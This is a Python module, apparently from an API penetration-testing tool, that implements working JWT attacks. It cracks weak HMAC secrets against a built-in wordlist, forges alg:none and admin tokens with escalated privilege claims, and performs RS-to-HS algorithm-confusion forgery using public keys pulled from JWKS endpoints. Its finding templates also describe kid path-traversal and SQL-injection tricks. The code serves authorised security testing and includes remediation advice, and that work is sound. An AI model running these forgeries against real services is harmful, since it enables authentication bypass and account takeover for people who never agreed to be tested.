"""
JWT analysis + offline attacks (pure, unit-tested).

Implements the JWT attacks from Hacking APIs (Ball, Ch 8): decode/analyze,
the `alg:none` forge, the HMAC weak-secret crack, and forging an admin token
once the secret is known. All crypto is stdlib (hmac/hashlib); the crack runs
fully offline (no requests to the provider). tools._run_jwt optionally tests a
forged token against a scoped endpoint.
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import time
from urllib.parse import urlparse

_ALG_HASH = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}

# Common signing secrets to try first (weak-config crack).
COMMON_SECRETS = [
    "secret", "password", "changeme", "admin", "123456", "key", "jwt", "test",
    "your-256-bit-secret", "secretkey", "secret_key", "hmac", "private", "token",
    "default", "supersecret", "s3cr3t", "qwerty", "letmein", "password1", "root",
]


def b64url_decode(s: str) -> bytes:
    s = s + "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s.encode())


def b64url_encode(b) -> str:
    if isinstance(b, str):
        b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def decode_jwt(token: str):
    """Return {header, payload, signature, parts} or None if not a JWT."""
    parts = (token or "").strip().split(".")
    if len(parts) < 2:
        return None
    try:
        header = json.loads(b64url_decode(parts[0]))
        payload = json.loads(b64url_decode(parts[1]))
    except Exception:
        return None
    return {"header": header, "payload": payload,
            "signature": parts[2] if len(parts) > 2 else "", "parts": parts}


def _signing_input(parts: list) -> str:
    return parts[0] + "." + parts[1]


def sign_hs(signing_input: str, secret, alg: str = "HS256") -> str:
    h = _ALG_HASH.get(alg.upper(), hashlib.sha256)
    key = secret.encode() if isinstance(secret, str) else secret
    return b64url_encode(hmac.new(key, signing_input.encode(), h).digest())


def verify_hs(token: str, secret) -> bool:
    d = decode_jwt(token)
    if not d or len(d["parts"]) < 3:
        return False
    alg = str(d["header"].get("alg", "")).upper()
    if alg not in _ALG_HASH:
        return False
    expected = sign_hs(_signing_input(d["parts"]), secret, alg)
    return hmac.compare_digest(expected, d["parts"][2])


def candidate_secrets(payload: dict, extra: list = None) -> list:
    """Common secrets + words derived from the token's issuer/audience host."""
    words = list(COMMON_SECRETS)
    for claim in ("iss", "aud"):
        v = str(payload.get(claim, ""))
        host = urlparse(v).hostname if "://" in v else v
        root = (host or "").split(".")[0]
        if root and 2 < len(root) < 40:
            words += [root, root + "2020", root + "2021", root + "2022",
                      root + "2023", root + "2024", root.capitalize(), root + "!"]
    for w in (extra or []):
        if w and w not in words:
            words.append(w)
    return list(dict.fromkeys(words))


def crack_secret(token: str, words: list):
    """Return the signing secret if any word verifies the HMAC signature; else None.
    Only HS256/384/512 are crackable this way."""
    d = decode_jwt(token)
    if not d or str(d["header"].get("alg", "")).upper() not in _ALG_HASH:
        return None
    for w in words:
        if verify_hs(token, w):
            return w
    return None


def forge_none(payload: dict) -> str:
    """A signature-less alg:none token carrying the given payload."""
    header = b64url_encode(json.dumps({"alg": "none", "typ": "JWT"}, separators=(",", ":")))
    body = b64url_encode(json.dumps(payload, separators=(",", ":")))
    return f"{header}.{body}."


def forge_hs(header: dict, payload: dict, secret, alg: str = "HS256") -> str:
    h = dict(header or {})
    h["alg"] = alg
    hb = b64url_encode(json.dumps(h, separators=(",", ":")))
    pb = b64url_encode(json.dumps(payload, separators=(",", ":")))
    return f"{hb}.{pb}.{sign_hs(hb + '.' + pb, secret, alg)}"


# Privilege-ish claims worth escalating in a forged token.
_PRIV_CLAIMS = ("admin", "superadmin", "is_admin", "isAdmin", "role", "roles",
                "scope", "scopes", "privilege", "priv", "group")


def escalate_payload(payload: dict) -> dict:
    """Return a copy of the payload with privilege claims flipped up + a fresh exp."""
    out = dict(payload)
    for k in list(out.keys()):
        if k in _PRIV_CLAIMS:
            if isinstance(out[k], bool):
                out[k] = True
            elif isinstance(out[k], str):
                out[k] = "admin"
    out.setdefault("admin", True)
    if "exp" in out:
        out["exp"] = int(time.time()) + 3600
    return out


# Asymmetric algorithms whose verifier can be tricked into HMAC-with-public-key (algorithm confusion).
_ASYM_ALGS = {"rs256", "rs384", "rs512", "es256", "es384", "es512", "ps256", "ps384", "ps512"}


def jwks_candidate_urls(target_url: str) -> list:
    """The well-known JWKS locations for the target's origin (public keys live here)."""
    try:
        p = urlparse(target_url)
        origin = "%s://%s" % (p.scheme, p.netloc)
    except Exception:
        return []
    return [origin + s for s in ("/.well-known/jwks.json", "/jwks.json", "/jwks", "/.well-known/openid-configuration/jwks")]


def _rsa_pem_from_numbers(n_b64: str, e_b64: str) -> str:
    """Rebuild the RSA public-key SPKI PEM from a JWK's base64url modulus/exponent."""
    try:
        from cryptography.hazmat.primitives import serialization
        from cryptography.hazmat.primitives.asymmetric import rsa
        n = int.from_bytes(b64url_decode(n_b64), "big")
        e = int.from_bytes(b64url_decode(e_b64), "big")
        pub = rsa.RSAPublicNumbers(e, n).public_key()
        return pub.public_bytes(serialization.Encoding.PEM,
                                serialization.PublicFormat.SubjectPublicKeyInfo).decode()
    except Exception:
        return ""


def first_rsa_pem(jwks_body: str) -> str:
    """Extract the first RSA public key from a JWKS (or a bare JWK) document as an SPKI PEM. '' if none."""
    try:
        doc = json.loads(jwks_body or "")
    except Exception:
        return ""
    keys = doc.get("keys") if isinstance(doc, dict) else None
    if keys is None and isinstance(doc, dict):
        keys = [doc]                                  # a bare single JWK
    for k in (keys or []):
        if isinstance(k, dict) and k.get("kty") == "RSA" and k.get("n") and k.get("e"):
            pem = _rsa_pem_from_numbers(k["n"], k["e"])
            if pem:
                return pem
    return ""


def x5c_to_pem(x5c_b64: str) -> str:
    """The public-key PEM from an x5c certificate carried in a JWT header (a second key source)."""
    try:
        from cryptography.hazmat.primitives import serialization
        from cryptography.x509 import load_der_x509_certificate
        cert = load_der_x509_certificate(base64.b64decode(x5c_b64))
        return cert.public_key().public_bytes(
            serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo).decode()
    except Exception:
        return ""


def pubkey_secret_variants(pem: str) -> list:
    """The exact byte forms of the public key a naive verifier is likely to hand to HMAC. Bounded and
    DETERMINISTIC (this is NOT a brute force over secrets) — the SPKI PEM with and without the trailing
    newline are the two forms crypto libraries store; algorithm confusion succeeds with whichever exact
    string the server passes to verify()."""
    if not pem:
        return []
    with_nl = pem if pem.endswith("\n") else pem + "\n"
    return list(dict.fromkeys([with_nl, with_nl.rstrip("\n")]))


def forge_key_confusion(payload: dict, pubkey_secret: str) -> str:
    """Forge an HS256 token whose HMAC secret is the RSA PUBLIC KEY PEM — the algorithm-confusion forgery."""
    return forge_hs({"typ": "JWT"}, payload, pubkey_secret, "HS256")


def tamper_signature(token: str) -> str:
    """The original token with a mangled signature — a control that a sound verifier MUST reject, so an
    'accept' on the forged token is only meaningful when this is rejected (kills accept-anything FPs)."""
    parts = (token or "").split(".")
    if len(parts) < 3 or not parts[2]:
        return (token or "") + "x"
    sig = parts[2]
    flip = "A" if sig[-1] != "A" else "B"
    return ".".join([parts[0], parts[1], sig[:-1] + flip])


def key_confusion_finding(url: str, oracle: str) -> dict:
    return {
        "title": "JWT algorithm confusion (RS→HS): forged token accepted",
        "severity": "critical", "family": "jwt", "confidence": "confirmed", "target": url,
        "cwe": "CWE-347", "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N", "cvss_score": 9.1,
        "description": ("The server accepted an HS256 token signed with its OWN RSA public key as the HMAC "
                        "secret. Its verifier picks the algorithm from the attacker-controlled header, so a "
                        "public value (the signing key) becomes a forgery secret — tokens can be minted for "
                        "any user without the private key."),
        "evidence": ("An HS256 token HMAC-signed with the server's published RSA public key authenticated at "
                     "%s while a signature-tampered token was rejected. %s" % (url, oracle)),
        "success_oracle": ("the HS256-with-public-key forged token authenticated where a tampered token did "
                           "not — the verifier treats the RSA public key as a symmetric secret"),
        "reproduction_steps": [
            "Fetch the RSA public key (JWKS at /.well-known/jwks.json, or the token's x5c header).",
            "Forge a token: header {alg:HS256}, escalated payload, HMAC-signed using the public-key PEM as the secret.",
            "Send it to %s; it authenticates where a signature-tampered token is rejected." % url],
        "impact": "Full authentication bypass and privilege escalation — forge a valid token for any user, including admin.",
        "remediation": ("Pin the expected algorithm server-side (accept only RS*/ES* for an asymmetric key); never let "
                        "the verifier choose the algorithm from the token header, and keep symmetric/asymmetric keys separate."),
        "tags": ["jwt", "auth", "algorithm-confusion", "cwe-347"],
    }


def analyze(token: str, extra_secrets: list = None) -> dict:
    """Full offline analysis. Returns {decoded, findings, cracked_secret,
    forged_none, forged_admin}."""
    d = decode_jwt(token)
    if not d:
        return {"decoded": None, "findings": [], "cracked_secret": None}
    alg = str(d["header"].get("alg", "")).lower()
    payload = d["payload"]
    findings = []

    if alg == "none" or alg == "":
        findings.append({
            "title": "JWT signed with alg:none (unsigned)", "severity": "critical",
            "target": "jwt", "description": "The token declares alg:none, so any payload is accepted unsigned.",
            "impact": "Full token forgery — impersonate any user, including admins.",
            "reproduction_steps": ["Decode the JWT", "Set the payload to an admin user", "Send with the signature removed"],
            "cwe": "CWE-347", "family": "jwt", "tags": ["jwt", "auth"],
            "remediation": "Reject alg:none; pin the expected algorithm server-side."})

    cracked = crack_secret(token, candidate_secrets(payload, extra_secrets))
    forged_none = forge_none(escalate_payload(payload))
    forged_admin = None
    if cracked:
        forged_admin = forge_hs(d["header"], escalate_payload(payload), cracked,
                                str(d["header"].get("alg", "HS256")))
        findings.append({
            "title": "JWT signing secret is weak/crackable", "severity": "high",
            "target": "jwt", "description": f"The HMAC signing secret was recovered offline: '{cracked}'.",
            "impact": "Forge valid tokens for any user (privilege escalation, account takeover).",
            "reproduction_steps": [f"Crack the HS* secret ('{cracked}')",
                                   "Re-sign a token with escalated claims", "Send it to the API"],
            "evidence": f"secret={cracked}", "cwe": "CWE-326", "family": "jwt", "tags": ["jwt", "auth"],
            "remediation": "Use a long, random, high-entropy secret (>=256-bit); rotate leaked secrets."})

    priv = [k for k in _PRIV_CLAIMS if k in payload]
    if priv and (alg == "none" or cracked):
        findings.append({
            "title": "Forgeable privilege claims in JWT", "severity": "high",
            "target": "jwt", "description": f"The payload carries privilege claims {priv} in a forgeable token.",
            "impact": "Escalate to admin by flipping these claims in a forged token.",
            "reproduction_steps": ["Forge a token with the privilege claim set to admin/true"],
            "cwe": "CWE-347", "family": "jwt", "tags": ["jwt", "auth"]})

    # Algorithm confusion (RS/ES/PS -> HS): a server that verifies with a generic
    # verify(token, key) may accept an HS256 token signed with the PUBLIC key as the
    # HMAC secret — forgery without the private key. Offline analysis can only flag it;
    # confirmation needs the server to ACCEPT the forged token, so this is a LEAD.
    _ASYM = {"rs256", "rs384", "rs512", "es256", "es384", "es512", "ps256", "ps384", "ps512"}
    if alg in _ASYM:
        findings.append({
            "title": f"JWT uses {alg.upper()} — test algorithm confusion (RS→HS)", "severity": "high",
            "target": "jwt", "confidence": "candidate", "family": "jwt", "tags": ["jwt", "auth"], "cwe": "CWE-347",
            "description": ("The token is signed with an asymmetric algorithm. If the server verifies with a generic "
                            "verify(token, key), it may accept an HS256 token signed with the PUBLIC key as the HMAC "
                            "secret (algorithm confusion) — token forgery without the private key."),
            "impact": "Forge arbitrary tokens (account takeover) using only the public key.",
            "reproduction_steps": [
                "Obtain the public key (JWKS at /.well-known/jwks.json or /jwks, or from the TLS certificate).",
                "Forge a token: header {alg:HS256}, escalated payload, HMAC-signed using the PUBLIC KEY PEM as the secret.",
                "Send it to an authenticated endpoint; acceptance CONFIRMS algorithm confusion."],
            "false_positive_check": "Only vulnerable if the server ACCEPTS the HS256-forged token — until then this is a lead.",
            "remediation": "Pin the expected algorithm server-side; never let the verifier choose HS* against an RSA/EC public key."})

    kid = d["header"].get("kid")
    if kid is not None:
        findings.append({
            "title": "JWT 'kid' header present — test kid injection / path traversal", "severity": "medium",
            "target": "jwt", "confidence": "candidate", "family": "jwt", "tags": ["jwt", "auth"], "cwe": "CWE-347",
            "description": (f"The header carries a key id (kid={kid!r}). If the server uses kid to LOAD the verification "
                            "key from a file/DB/URL without sanitisation, it may be steered to an attacker-known key — "
                            "path traversal to a predictable file, SQLi returning a chosen key, or an attacker-hosted JWKS."),
            "impact": "Point verification at a key you control → forge valid tokens.",
            "reproduction_steps": [
                "Set kid to a path traversal to a predictable-content file (e.g. '../../dev/null') and HS256-sign with the matching (empty) secret.",
                "Or inject SQL into kid so the key lookup returns a chosen value; or set kid to an attacker-hosted JWKS URL.",
                "Send the forged token; acceptance CONFIRMS kid injection."],
            "false_positive_check": "A kid header is normal; only a server that accepts a kid-steered forged token is vulnerable.",
            "remediation": "Treat kid as an opaque allowlisted lookup key; never use it as a file path, URL, or SQL value."})

    exp = payload.get("exp")
    if isinstance(exp, (int, float)) and exp < time.time():
        findings.append({
            "title": "JWT is expired (check server enforcement)", "severity": "low",
            "target": "jwt", "description": "The exp claim is in the past; verify the server actually rejects it.",
            "impact": "If exp is not enforced, stale/leaked tokens keep working.",
            "reproduction_steps": ["Replay the expired token", "If accepted, exp is not enforced"],
            "cwe": "CWE-613", "family": "jwt", "tags": ["jwt", "auth"]})

    return {"decoded": {"header": d["header"], "payload": payload}, "findings": findings,
            "cracked_secret": cracked, "forged_none": forged_none, "forged_admin": forged_admin}
